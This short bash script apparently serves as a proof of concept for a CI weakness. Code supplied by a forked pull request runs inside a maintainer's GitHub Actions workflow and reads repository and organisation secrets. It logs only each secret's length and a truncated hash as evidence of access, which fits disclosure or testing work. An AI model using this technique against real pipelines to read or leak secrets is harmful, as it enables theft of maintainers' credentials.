#!/usr/bin/env bash
# Supplied by the fork. The attacker's pull request touches NO workflow file at all.
echo "PQ|VERSION=ATTACKER-SUPPLIED-NO-WORKFLOW-IN-MY-DIFF|event=${GITHUB_EVENT_NAME:-?}|ref=${GITHUB_REF:-?}|run=${GITHUB_RUN_ID:-?}"
printf 'PQ|SECRET|len=%s sha256-16=%s\n' "${#S}" "$(printf %s "${S:-}" | sha256sum | cut -c1-16)"
echo "PQ|ORGSEC|len=${#O} sha256-16=$(printf %s "${O:-}" | sha256sum | cut -c1-16)"
echo "PQ|WHOAMI|no workflow file of mine exists anywhere; the workflow running me is the maintainer's"
